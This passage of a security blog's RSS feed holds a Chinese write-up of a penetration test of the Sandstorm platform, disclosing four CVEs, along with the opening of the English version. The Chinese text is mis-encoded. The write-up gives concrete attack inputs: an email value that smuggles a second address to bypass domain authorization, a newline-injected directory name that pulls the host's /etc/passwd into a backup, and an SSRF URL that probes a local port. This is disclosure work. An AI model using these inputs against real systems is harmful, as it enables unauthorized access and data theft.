  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400&quot;&gt;Heap exploitation&lt;/a&gt;: (Chinese) A slide introducing basic glibc heap exploitation by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/advanced-heap-exploitaion&quot;&gt;Advanced heap exploitation&lt;/a&gt;: (Chinese) A slide of advanced heap exploitation techniques by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.tw/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;The poisoned NUL byte&lt;/a&gt;: An article of Null byte off-by-one exploitation by Project Zero&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä¸€æ¬¡åœ¨ Sandstorm è·³è„«æ²™ç®±çš„æ»²é€ç¶“é©—</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;ä¸€æ¬¡åœ¨ Sandstorm è·³è„«æ²™ç®±çš„æ»²é€ç¶“é©—&lt;/a&gt; (ä¸­æ–‡ç‰ˆæœ¬)&lt;/p&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;2017 å¹´åˆï¼Œæˆ‘å€‘æœ‰å€‹æ»²é€æ¸¬è©¦å°ˆæ¡ˆï¼Œå°ˆæ¡ˆçš„æ¨™çš„æ¶æ§‹åœ¨ &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt; ä¹‹ä¸Šã€‚Sandstorm æ˜¯ä¸€æ¬¾ Web å¹³å°ï¼Œä½¿ç”¨è€…å¯ä»¥è¼•æ˜“çš„åœ¨è©²å¹³å°å®‰è£å„ç¨® Web Appï¼ˆå¦‚ WordPressã€GitLabâ€¦ï¼‰ï¼Œè©²å¹³å°æœ€å¤§çš„ç‰¹è‰²åœ¨æ–¼é€™äº› App éƒ½æ˜¯åœ¨æ²™ç®±ä¸­åŸ·è¡Œã€‚å› æ­¤ï¼Œå³ä½¿æˆ‘å€‘æ¸¬è©¦ä¸­æ‰¾åˆ°å¤šé … App å¼±é»ï¼Œä¹Ÿç„¡æ³•å°å¹³å°æœ¬èº«é€ æˆå¨è„…ã€‚&lt;/p&gt;

&lt;p&gt;ç‚ºäº†è®“å¼±é»æ•ˆç›Šæœ€å¤§åŒ–ï¼Œæˆ‘å€‘å°‡ä¸€éƒ¨åˆ†ç²¾åŠ›è½‰ç§»åˆ°ç ”ç©¶ Sandstorm åŸå§‹ç¢¼ï¼Œç›®çš„æ˜¯è·³è„« App çš„æ²™ç®±ç’°å¢ƒçœ‹æœ‰æ²’æœ‰æ©Ÿæœƒå½±éŸ¿æ•´å°ä¼ºæœå™¨ã€‚æœ€å¾Œï¼Œæˆ‘å€‘æ‰¾åˆ°äº†å¹¾å€‹å°‘è¦‹ä¸”æœ‰è¶£çš„å¼±é»ï¼Œä¸¦ç”³è«‹ CVE ç·¨è™Ÿå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;é˜»æ–·æœå‹™æ”»æ“Šï¼ˆDenial of Serviceï¼‰ï¼ŒCVE-2017-6198&lt;/li&gt;
  &lt;li&gt;ç¹éæˆæ¬Šæ¨¡å¼ï¼ˆBypassing Authorization Schemaï¼‰ï¼ŒCVE-2017-6199&lt;/li&gt;
  &lt;li&gt;ä¸å®‰å…¨çš„ç›´æ¥å­˜å–ç‰©ä»¶ï¼ˆInsecure Direct Object Referencesï¼‰ï¼ŒCVE-2017-6200&lt;/li&gt;
  &lt;li&gt;æœå‹™ç«¯è«‹æ±‚å½é€ ï¼ˆServer-Side Request Forgeryï¼‰ï¼ŒCVE-2017-6201&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;æ¼æ´ç´°ç¯€&quot;&gt;æ¼æ´ç´°ç¯€&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹æ¶ˆè€—ç³»çµ±è³‡æºé€ æˆçš„ DoSã€‚èµ·å› æ˜¯ Sandstorm ä¸¦æœªå®Œå–„é™åˆ¶æ¯å€‹ App æ‰€èƒ½ä½¿ç”¨çš„è³‡æºï¼Œåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; åƒ…é™åˆ¶äº†æ¯å€‹ç¨‹åºèƒ½å¤ æ‰“é–‹çš„æœ€å¤šæª”æ¡ˆæ•¸ï¼Œç›¸é—œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ supervisor æœªé™åˆ¶å­ç¨‹åºæ•¸é‡ä»¥åŠæœªé™åˆ¶å„²å­˜ç©ºé–“ç”¨é‡ï¼Œå› æ­¤æ”»æ“Šè€…åªè¦è®“ App ä¸æ–·åŸ·è¡Œ forkï¼ˆé€šå¸¸ç¨±ç‚º Fork Bombï¼‰æˆ–æ˜¯å¤§é‡ä½¿ç”¨ç¡¬ç¢Ÿç©ºé–“ï¼Œå°±æœƒé€ æˆä¼ºæœå™¨è³‡æºä¸è¶³è€Œä¸­æ–·æœå‹™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;é€šå¸¸ Sandstorm æœƒè¨­å®šç‰¹å®šçµ„ç¹”æˆå“¡æ‰èƒ½æ“æœ‰ç‰¹æ®Šçš„æ¬Šé™ï¼Œè€Œç³»çµ±é è¨­çš„çµ„ç¹”æˆå“¡åˆ¤æ–·æ–¹å¼æ˜¯æª¢æŸ¥ä½¿ç”¨è€… email ä¸­ã€Œ@ã€ç¬¦è™Ÿæœ€å¾Œçš„å­—ä¸²æ˜¯å¦åœ¨ç™½åå–®å…§ï¼Œç›¸é—œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å› æ­¤ï¼Œç•¶æ”»æ“Šè€…å¡«å…¥çš„ email ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;ï¼Œç³»çµ±ä¾¿æœƒå°‡æ”»æ“Šè€…è¦–ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; çµ„ç¹”çš„ä½¿ç”¨è€…ã€‚&lt;/p&gt;

&lt;p&gt;é€™é …æ”»æ“Šå¾—ä»¥æˆåŠŸé‚„æœ‰å¦å¤–ä¸€å€‹é—œéµé»ï¼Œç™¼ç”Ÿåœ¨ Sandstorm ç™»å…¥çš„ä¸€å€‹ç‰¹è‰²ä¸Šã€‚ä½¿ç”¨ Sandstorm æœå‹™ä¸éœ€è¦è¨­å®šå¯†ç¢¼ï¼Œä½¿ç”¨è€…æ¯æ¬¡æ¬²ç™»å…¥æ™‚å¡«å…¥ emailï¼Œç³»çµ±ä¾¿æœƒç™¼é€ä¸€çµ„æ¯æ¬¡çš†ä¸åŒçš„éš¨æ©Ÿå¯†ç¢¼ä½œç‚ºç™»å…¥ä½¿ç”¨ã€‚ä¸Šè¿°çš„ä¾‹å­ä¹‹æ‰€ä»¥èƒ½å¤ æˆåŠŸï¼Œå°±æ˜¯å› ç‚ºç³»çµ±å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; è¦–ç‚ºä¸€å€‹ aaa.bbb ç¶²åŸŸçš„ä½¿ç”¨è€…ï¼Œè€Œéš¨æ©Ÿå¯†ç¢¼æœƒç™¼é€åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; å…©å€‹ä¸åŒä¿¡ç®±ä¸­ï¼Œåªè¦å¯ä»¥æ”¶åˆ°å¯†ç¢¼å°±å¯ä»¥ç™»å…¥ä½¿ç”¨æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;ç›´æ¥æ¡ˆä¾‹èªªæ˜ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;åœ¨ Sandstorm é™å®šåªæœ‰ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; ç¶²åŸŸæ‰å¯ä»¥ç™»å…¥ã€‚
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç™»å…¥è™• email æ¬„ä½å¡«å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;ã€‚ï¼ˆè¨»ï¼šemail æ¬„ä½åœ¨å‰ç«¯æœ‰ç”¨ HTML5 Validationï¼Œä½†å¾Œç«¯ä¸¦ç„¡æª¢æŸ¥ email æ˜¯å¦åˆæ³•ï¼‰
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;åœ¨ demo@devco.re ä¿¡ç®±æ”¶åˆ°éš¨æ©Ÿå¯†ç¢¼ã€‚
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æˆåŠŸç™»å…¥ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; è¢«è¦–ç‚ºä¸€å€‹ä½¿ç”¨è€…ï¼Œä¸”ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; çµ„ç¹”æˆå“¡ï¼
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;åœ¨æˆ‘å€‘çš„æ»²é€æ¸¬è©¦ä¸­ï¼Œæ¨™çš„ç¶²ç«™æ˜¯å…è¨±èªè­‰çš„ç¶²åŸŸä½¿ç”¨è€…è‡ªè¡Œå®‰è£ App çš„ã€‚å› æ­¤é€éé€™é …ç¹éå¼±é»ï¼Œæ”»æ“Šè€…å¯ä»¥å†æ­é…æœ¬ç¯‡å…¶ä»–æ¼æ´ï¼ˆCVE-2017-6198ã€CVE-2017-6200ã€CVE-2017-6201ï¼‰åšæ›´é€²ä¸€æ­¥çš„æ”»æ“Šã€‚&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹æœ‰è¶£çš„å¼±é»ï¼Œç¸½å…±çµ„åˆäº†å…©å€‹é©—è­‰ä¸Šçš„å°ç–å¿½æ‰èƒ½é”æˆæ”»æ“Šï¼
åœ¨ Sandstorm ä¸­æ¯å€‹ Grainï¼ˆSandstorm containerï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ä¸€å€‹ App æ²™ç®±ï¼‰çš„æ“æœ‰è€…éƒ½å¯ä»¥ä¸‹è¼‰è©² App çš„å‚™ä»½è³‡æ–™ï¼Œä½†ç”±æ–¼æ‰“åŒ…æµç¨‹ä¸­å­˜åœ¨å…©å€‹å¼±é»ï¼Œå› æ­¤æ”»æ“Šè€…å¯ä»¥æ‰“åŒ…æ²™ç®±å¤–ä¼ºæœå™¨çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; å’Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; ä¸‹çš„æª”æ¡ˆã€‚ç™¼ç”Ÿçš„å•é¡Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;æ‰“åŒ…çš„æµç¨‹éš±è—äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; ç­‰æ•æ„Ÿç›®éŒ„ï¼Œå»æ²’æœ‰éš±è— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; é€™å…©å€‹ç›®éŒ„ã€‚é€™å…©å€‹ç›®éŒ„åˆ†åˆ¥æ˜¯ä¼ºæœå™¨ä¸‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; å’Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; çš„åˆ¥åï¼Œæ˜¯è¼ƒå¾ŒæœŸçš„åŠŸèƒ½ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç³»çµ±æœƒå°‡æ¬²æ‰“åŒ…çš„åˆæ³•æª”æ¡ˆæ•´ç†å‡ºä¾†é€éæ¨™æº–è¼¸å…¥ä»‹é¢å‚³çµ¦ zip æ‰“åŒ…ï¼Œè€Œåˆ¤æ–·æª”æ¡ˆå’Œæª”æ¡ˆé–“çš„å€éš”æ˜¯é æ›è¡Œç¬¦è™Ÿ(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt;)ã€‚å› æ­¤ï¼Œç•¶æª”åä¸­å‡ºç¾æ›è¡Œç¬¦è™Ÿï¼Œå¯ä»¥æ’å…¥éæ³•çš„è·¯å¾‘æª”åè—‰ç”± zip æ‰“åŒ…ã€‚ç¨‹å¼é›–ç„¶æœ‰æª¢æŸ¥æª”åæ˜¯å¦å­˜åœ¨æ›è¡Œç¬¦ï¼Œå»ç–å¿½äº†æª¢æŸ¥ç›®éŒ„åã€‚&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç¶œåˆä¸Šè¿°å…©å€‹å¼±é»ï¼Œæ”»æ“Šè€…åªè¦åœ¨æ²™ç®±å…§å»ºç«‹ä¸€å€‹ç›®éŒ„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;ï¼Œå°±å¯ä»¥é€éä¸‹è¼‰å‚™ä»½çš„åŠŸèƒ½å–å¾—å«æœ‰ä¼ºæœå™¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; æª”æ¡ˆçš„å‚™ä»½æª”ã€‚&lt;/p&gt;

&lt;p&gt;å¯¦éš›æƒ…å¢ƒæˆªåœ–ï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;å…ˆåœ¨ Grain è£¡æ–°å»ºç›®éŒ„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;ï¼Œä¸¦ç”¨ Grain Backup çš„åŠŸèƒ½ä¸‹è¼‰å‚™ä»½æª”ã€‚
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;è§£é–‹å‚™ä»½æª”å¾Œåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; ç›®éŒ„ä¸‹çœ‹åˆ°æ²™ç®±å¤–ä¼ºæœå™¨çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯ç¶“å…¸çš„ SSRFï¼ˆServer-Side Request Forgeryï¼‰å•é¡Œï¼Œåœ¨ Sandstorm å®‰è£ App æµç¨‹æ²’æœ‰é™åˆ¶å®‰è£ä¾†æºï¼Œæ”»æ“Šè€…æä¾›ä¸€å€‹å®‰è£ URL å°±èƒ½è®“ä¼ºæœå™¨å­˜å–è©²ä½ç½®ã€‚è©²å•é¡Œç™¼ç”Ÿåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt;ï¼Œé€™å€‹ç¯„ä¾‹é€£çµå¾—ä»¥ç¢ºèªä¼ºæœå™¨çš„ 22 port æ˜¯å¦é–‹å•Ÿã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;ï¼ˆParse Errorï¼Œä»£è¡¨ä¼ºæœå™¨ 22 port é–‹å•Ÿï¼‰&lt;/center&gt;

&lt;h2 id=&quot;å¾ŒçºŒ&quot;&gt;å¾ŒçºŒ&lt;/h2&gt;

&lt;p&gt;åœ¨æäº¤å¼±é»å¾Œï¼ŒSandstorm å®˜æ–¹éå¸¸è¿…é€Ÿä¿®æ­£äº†å¼±é»ï¼Œä¸¦ä¸”ç™¼è¡¨äº†ä¸€ç¯‡æ–‡ç« ï¼š
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é€™æ¬¡æ»²é€ç¶“é©—ä¸­ï¼Œæˆ‘å€‘èªç‚º Sandstorm æ˜¯ä¸€æ¬¾å®‰å…¨ã€æœ‰å‡ºè‰²é˜²ç¦¦æ©Ÿåˆ¶çš„å¹³å°ã€‚ä¸»è¦åŸå› å–æ±ºæ–¼å®ƒçš„ä¸€å€‹æ ¸å¿ƒè¨­è¨ˆç†å¿µï¼šå°±æ˜¯å‡è¨­ä½¿ç”¨è€…å®‰è£çš„ App éƒ½æ˜¯æƒ¡æ„çš„ã€‚ä»¥é€™æ¨£çš„å‰æå‡ºç™¼å»ä¿è­·æ ¸å¿ƒç³»çµ±çš„å®‰å…¨ï¼Œå»ºç«‹èµ·ä¾†çš„é˜²ç¦¦æ©Ÿåˆ¶è‡ªç„¶æ˜¯å…¨é¢ä¸”å®Œå–„çš„ã€‚é™¤äº†ä¼ºæœå™¨æœ¬èº«çš„ä¿è­·ï¼Œä¸€äº›å¸¸è¦‹çš„å®¢æˆ¶ç«¯æ”»æ“Šï¼ˆä¾‹å¦‚ï¼šXSSã€CSRFï¼‰ä¹Ÿé€é Sandstorm ç‰¹æ®Šçš„éš¨æ©Ÿ hostname ç­‰æ©Ÿåˆ¶ä¿è­·çš„å¾ˆå¥½ã€‚å› æ­¤æ”»æ“Šè€…å¾ˆé›£å¾ App æœ¬èº«å»ç ´å£ä¼ºæœå™¨ï¼Œä¹Ÿå¾ˆé›£é€éæ”»æ“Šå®¢æˆ¶ç«¯å»æå‡ä½¿ç”¨è€…çš„æ¬Šé™ã€‚&lt;/p&gt;

&lt;p&gt;å„˜ç®¡æ˜¯å¦‚æ­¤å„ªç§€çš„å¹³å°ï¼Œä»èˆŠæœƒå› ä¸€äº›å°åœ°æ–¹ç–å¿½å°è‡´æ”»æ“Šè€…æœ‰æ©Ÿå¯ä¹˜ã€‚é€™æ¬¡ç™¼ç¾å¼±é»çš„åœ°æ–¹å¤šåŠåœ¨æ–¼ library çš„èª¤ç”¨å’Œæ–°åŠŸèƒ½çš„æ’°å¯«æ²’æœ‰è€ƒæ…®åˆ°èˆŠæœ‰é˜²ç¦¦æ¶æ§‹ã€‚é€™åœ¨å…¶ä»–å°ˆæ¡ˆä¹Ÿæ˜¯å¸¸è¦‹çš„å•é¡Œï¼Œè—‰æ©Ÿä¹Ÿæé†’é–‹ç™¼è€…åœ¨é–‹ç™¼æ–°åŠŸèƒ½æ™‚æ‡‰åšå…¨é¢çš„å®‰å…¨æª¢è¦–ï¼Œä»¥é¿å…é˜²ç¦¦è½å·®æ‰€å°è‡´çš„å¼±é»ã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Sandstorm Security Review</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;ä¸€æ¬¡åœ¨ Sandstorm è·³è„«æ²™ç®±çš„æ»²é€ç¶“é©—&lt;/a&gt; (ä¸­æ–‡ç‰ˆæœ¬)&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;In early 2017, we had a pentesting target protected with &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt;. Sandstorm is a web-based platform which allows users to install their web apps, such as WordPress, GitLab, etc. The main feature of Sandstorm is that it containerizes every app in its own sandbox. Therefore, even though we had found several vulnerabilities of the apps, we still could not put a threat to the server.&lt;/p&gt;

&lt;p&gt;In order to leverage the vulnerabilities, we put part of efforts into review of Sandstormâ€™s source codes, and tried to escape the sandbox to impact the whole server. Finally, we found a number of uncommon and interesting vulnerabilities, and received CVE IDs as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-6198 (Denial of Service)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6199 (Bypassing Authorization Schema)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6200 (Insecure Direct Object References)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6201 (Server-Side Request Forgery)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;exploitation-details&quot;&gt;Exploitation Details&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;This is a DoS created by system resource exhaustion. The root cause is that Sandstorm does not have a comprehensive policy to limit the amount of resource used by every apps run on it. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; only the maximum number of files opened by each process was limited. See the codes below:&lt;/p&gt;

